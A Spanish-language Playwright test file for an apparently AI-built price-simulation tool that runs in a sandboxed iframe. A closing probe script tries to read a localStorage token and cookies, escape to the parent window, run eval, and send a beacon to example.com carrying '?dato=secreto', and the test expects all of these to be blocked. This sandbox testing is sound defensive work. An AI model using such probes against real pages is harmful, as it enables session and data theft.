import { expect, test, type Page } from "@playwright/test";

import { decir } from "../helpers/chat";
import {
  BEBIDAS,
  PREGUNTA_BEBIDAS,
  ROTA,
  TRAMPOSA,
  preciosReales,
  restaurarPrecios,
  simular,
  simularCorreccion,
  simularHerramienta,
} from "../helpers/herramientas";
import { simularFrases } from "../helpers/mock";
import { API_URL } from "../helpers/env";
import { esperarHerramienta, mensajes, montarHerramienta } from "../helpers/sandbox";

/**
 * Fase G6 · herramientas a medida (N3): "¿qué pasa si subo 10 % las bebidas?"
 * arma un simulador que corre AISLADO, y lo que propone se confirma como
 * cualquier acción.
 *
 * Lo que escribe el modelo está simulado (no gasta créditos, no cambia entre
 * corridas), pero el código que corre es uno que el modelo escribió de verdad
 * (fixtures/herramienta-bebidas.json). El cambio de precios es real y se
 * deshace al terminar. Lo que el modelo escribe hoy se mide aparte, en
 * e2e/experimentos.
 */

const panel = (page: Page) => page.getByTestId("omnibox-mesa");
const marco = (page: Page) => page.frameLocator('[data-testid="herramienta-marco"]');
const tarjeta = (page: Page) => page.getByTestId("tarjeta-herramienta").last();
const precios = (page: Page) => page.getByTestId("tarjeta-precios").last();
const IDS = BEBIDAS.datos.precios_bebidas.filas.map((f) => f._productId as string);

async function pedir(page: Page, respuestas: Parameters<typeof simularHerramienta>[1], demora = 0) {
  await simularFrases(page, { [PREGUNTA_BEBIDAS]: simular() });
  const pedidos = await simularHerramienta(page, respuestas, demora);
  await page.goto("/omnibox");
  await decir(page, PREGUNTA_BEBIDAS);
  return pedidos;
}

test.describe("una herramienta a medida", () => {
  test("simula la suba, propone los precios y, confirmados, quedan en la tienda", async ({ page, request }) => {
    test.slow();
    const antes = await preciosReales(request, IDS);
    expect(antes.size).toBe(4);
    try {
      const pedidos = await pedir(page, [BEBIDAS], 1500);

      // Mientras se arma, la tarjeta dice que se está armando (la de verdad tarda ~45 s).
      await expect(tarjeta(page)).toHaveAttribute("data-fase", "armando");
      await expect(tarjeta(page)).toContainText("Armando una herramienta a medida");
      expect(pedidos[0].pregunta).toBe(PREGUNTA_BEBIDAS);

      // Lista: se abre sola en el panel.
      await expect(tarjeta(page)).toHaveAttribute("data-fase", "lista");
      await expect(panel(page)).toHaveAttribute("data-mesa", "herramienta");
      await expect(panel(page).getByTestId("herramienta-titulo")).toHaveText(BEBIDAS.titulo);
      await expect(tarjeta(page)).toContainText("Abierta en el panel");

      // Corre en el iframe con los datos de la tienda: 10 % por defecto.
      await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();
      await expect(marco(page).getByText("Bs 13,20").first()).toBeVisible();

      // El deslizador recalcula al instante: +5 puntos, la coca a 13,80; y de vuelta.
      const suba = marco(page).locator('input[type="range"]').first();
      await suba.focus();
      for (let i = 0; i < 5; i++) await suba.press("ArrowRight");
      await expect(marco(page).getByText("Bs 13,80").first()).toBeVisible();
      for (let i = 0; i < 5; i++) await suba.press("ArrowLeft");
      await expect(marco(page).getByText("Bs 13,20").first()).toBeVisible();

      // Proponer no cambia nada: aparece la tarjeta para revisar, con el antes y el después.
      await marco(page).getByRole("button", { name: "Proponer Nuevos Precios" }).click();
      await expect(precios(page)).toHaveAttribute("data-estado", "pendiente");
      await expect(precios(page)).toContainText("Cambiar 4 precios");
      await expect(precios(page)).toContainText(`Lo propuso «${BEBIDAS.titulo}»`);
      const fila = precios(page).getByTestId("precio-cambio").filter({ hasText: "Coca Cola 2L" });
      await expect(fila).toContainText("Bs 12,00");
      await expect(fila).toContainText("Bs 13,20");
      await expect(fila).toContainText("+10 %");
      expect((await preciosReales(request, IDS)).get(IDS[2])).toBe(antes.get(IDS[2]));

      // Proponer de nuevo reemplaza la tarjeta pendiente: no se apilan.
      await marco(page).getByRole("button", { name: "Proponer Nuevos Precios" }).click();
      await expect(page.getByTestId("tarjeta-precios")).toHaveCount(1);

      // Confirmado: los cuatro de una vez.
      await precios(page).getByTestId("precios-confirmar").click();
      await expect(precios(page)).toHaveAttribute("data-estado", "aplicado");
      await expect(precios(page)).toContainText("Se cambiaron 4 precios");
      const despues = await preciosReales(request, IDS);
      for (const f of BEBIDAS.datos.precios_bebidas.filas) {
        expect(despues.get(f._productId as string)).toBeCloseTo(Math.round((f.precio as number) * 1.1 * 100) / 100, 2);
      }
    } finally {
      await restaurarPrecios(request, antes);
    }
  });

  test("cancelar la propuesta no cambia nada", async ({ page, request }) => {
    const antes = await preciosReales(request, IDS);
    await pedir(page, [BEBIDAS]);
    await marco(page).getByRole("button", { name: "Proponer Nuevos Precios" }).click();
    await precios(page).getByTestId("precios-cancelar").click();
    await expect(precios(page)).toHaveAttribute("data-estado", "cancelado");
    expect(await preciosReales(request, IDS)).toEqual(antes);
  });

  test("si se rompe al dibujarse, el error vuelve al modelo una vez y la corregida la reemplaza", async ({ page }) => {
    const correcciones = await simularCorreccion(page, { tsx: BEBIDAS.tsx, codigo: BEBIDAS.codigo });
    await pedir(page, [{ ...BEBIDAS, codigo: ROTA }]);

    await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();
    expect(correcciones).toHaveLength(1);
    expect(correcciones[0].error).toContain("Cannot read properties of undefined");
    expect(correcciones[0].pregunta).toBe(PREGUNTA_BEBIDAS);
    expect(correcciones[0].plan).toEqual(BEBIDAS.plan);
    // Los datos no se vuelven a leer: van los mismos con que se armó.
    expect(correcciones[0].datos).toEqual(BEBIDAS.datos);
  });

  test("si se rompe de nuevo no se insiste: se dice, y sus datos quedan en una tabla", async ({ page }) => {
    const correcciones = await simularCorreccion(page, { tsx: BEBIDAS.tsx, codigo: ROTA });
    await pedir(page, [{ ...BEBIDAS, codigo: ROTA }]);

    await expect(panel(page).getByTestId("herramienta-rota")).toContainText("La herramienta no funcionó");
    expect(correcciones).toHaveLength(1);
    await panel(page).getByTestId("herramienta-ver-datos").click();
    await expect(panel(page)).toHaveAttribute("data-mesa", "analisis");
    // La tabla lee la fuente de verdad, con los mismos parámetros que usó la herramienta.
    await expect(panel(page).locator('[data-testid="vista-pieza"][data-fuente="precios_por_producto"]')).toContainText("Coca Cola 2L");
  });

  test("si no se pudo armar, se dice y se puede pedir de nuevo", async ({ page }) => {
    const pedidos = await pedir(page, [
      { status: 422, message: "No pude armar una herramienta que funcione para eso. Probá pidiéndolo más concreto." },
      BEBIDAS,
    ]);
    await expect(tarjeta(page)).toHaveAttribute("data-fase", "error");
    await expect(tarjeta(page)).toContainText("Probá pidiéndolo más concreto");
    await tarjeta(page).getByTestId("herramienta-reintentar").click();
    await expect(tarjeta(page)).toHaveAttribute("data-fase", "lista");
    await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();
    expect(pedidos).toHaveLength(2);
  });

  test("solo vale lo que propone ESTA herramienta, y solo con productos de sus datos", async ({ page }) => {
    await pedir(page, [BEBIDAS]);
    await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();

    // Un mensaje con la misma forma, pero de otra ventana (acá, la propia página): se ignora.
    await page.evaluate((id) => {
      window.postMessage({ vendfy: true, tipo: "proponer", accion: { tipo: "precios", cambios: [{ productId: id, precio: 1 }], motivo: "x" } }, "*");
    }, IDS[2]);
    await page.waitForTimeout(800);
    await expect(page.getByTestId("tarjeta-precios")).toHaveCount(0);
  });

  test("una propuesta con un producto que no estaba en sus datos no llega a la tarjeta", async ({ page }) => {
    await pedir(page, [{ ...BEBIDAS, codigo: TRAMPOSA }]);
    await marco(page).getByRole("button", { name: "Aplicar" }).click();
    await expect(page.getByText("La herramienta propuso un producto que no estaba en sus datos.")).toBeVisible();
    await expect(page.getByTestId("tarjeta-precios")).toHaveCount(0);
  });

  test("queda en la conversación: al recargar, la herramienta sigue ahí", async ({ page }) => {
    await pedir(page, [BEBIDAS]);
    await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();
    await expect(page.getByTestId("conversacion-guardado")).toHaveAttribute("data-estado", "guardado");
    await page.reload();
    await expect(tarjeta(page)).toHaveAttribute("data-fase", "lista");
    await expect(panel(page)).toHaveAttribute("data-mesa", "herramienta");
    await expect(marco(page).getByText("Coca Cola 2L").first()).toBeVisible();
  });
});

/**
 * El aislamiento, probado desde adentro: una herramienta que intenta todo lo
 * que no debería poder (lo que la revisión del servidor ya rechaza, pero acá
 * se salta esa barrera a propósito para probar la segunda).
 */
const SONDA = `"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const React = require("react");
function probar(nombre, f) {
  try { const v = f(); return nombre + ":paso:" + String(v).slice(0, 40); }
  catch (e) { return nombre + ":bloqueado:" + (e && e.name); }
}
exports.default = function Herramienta(props) {
  React.useEffect(function () {
    const resultados = [
      probar("ventana de Vendfy", function () { return window.parent.document.title; }),
      probar("dirección de Vendfy", function () { return window.top.location.href; }),
      probar("almacenamiento", function () { return localStorage.getItem("token"); }),
      probar("cookies", function () { return document.cookie; }),
      probar("ventana nueva", function () { if (window.open("https://example.com") === null) throw { name: "SinVentana" }; return "abrió"; }),
      probar("eval", function () { return eval("1 + 1"); }),
      probar("new Function", function () { return new Function("return 1")(); }),
    ];
    try { window.top.location.href = "https://example.com/"; } catch (e) {}
    fetch("${API_URL}/api/health").then(
      function () { props.proponer({ sonda: "red", resultado: "paso" }); },
      function (e) { props.proponer({ sonda: "red", resultado: "bloqueado:" + e.name }); }
    );
    props.proponer({ sonda: "todo", resultados: resultados });
  }, []);
  return React.createElement("img", { src: "https://example.com/pixel.png?dato=secreto", alt: "" });
};`;

test.describe("el aislamiento de una herramienta", () => {
  test("no puede salir: ni la red, ni la ventana de Vendfy, ni la sesión, ni ventanas, ni eval", async ({ page }) => {
    // Lo que salió de verdad a la red tiene respuesta; lo que frenó la política, no (falla con motivo "csp").
    const respondidos: string[] = [];
    const frenados: string[] = [];
    page.on("response", (r) => respondidos.push(r.url()));
    page.on("requestfailed", (r) => frenados.push(`${r.url()} ${r.failure()?.errorText}`));
    await montarHerramienta(page, { codigo: SONDA, datos: {} });
    expect(await esperarHerramienta(page)).toBe("lista");

    await expect.poll(async () => (await mensajes(page)).filter((m) => m.tipo === "proponer").length).toBe(2);
    const propuestas = (await mensajes(page)).filter((m) => m.tipo === "proponer").map((m) => m.accion as Record<string, unknown>);
    const todo = propuestas.find((p) => p.sonda === "todo")!.resultados as string[];
    for (const r of todo) expect(r, r).toContain(":bloqueado:");
    expect(propuestas.find((p) => p.sonda === "red")!.resultado).toBe("bloqueado:TypeError");

    // La página de afuera sigue donde estaba, y nada salió por la red.
    expect(new URL(page.url()).pathname).toBe("/__anfitrion");
    expect(respondidos.filter((u) => u.includes("example.com") || u.includes("/api/health"))).toEqual([]);
    expect(frenados).toContain("https://example.com/pixel.png?dato=secreto csp");
    // Y la política lo dejó anotado.
    const bloqueos = (await mensajes(page)).filter((m) => m.tipo === "bloqueo").map((m) => m.directiva as string);
    expect(bloqueos).toEqual(expect.arrayContaining(["img-src", "connect-src", "script-src"]));
  });
});
